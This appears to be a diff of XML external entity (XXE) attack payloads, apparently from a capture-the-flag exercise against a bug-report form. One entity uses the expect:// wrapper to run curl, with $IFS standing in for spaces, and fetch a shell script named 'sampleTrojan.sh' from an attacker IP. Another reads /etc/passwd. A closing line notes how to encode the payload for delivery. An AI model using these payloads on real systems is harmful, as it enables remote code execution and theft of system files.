@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE root [
-  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'">
+  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'10.10.14.69:80/sampleTrojan.sh">
 ]>
 <root>
 <bugreport>
@@ -11,4 +11,20 @@
 </bugreport>
 </root>
 
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+		<bugreport>
+		<title>e</title>
+		<cwe>e</cwe>
+		<cvss>e</cvss>
+		<reward>e</reward>
+		</bugreport>
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>e</cwe>
+		<cvss>e</cvss>
+		<reward>e</reward>
+		</bugreport>
 base64 + iso-8859-1 then url envode
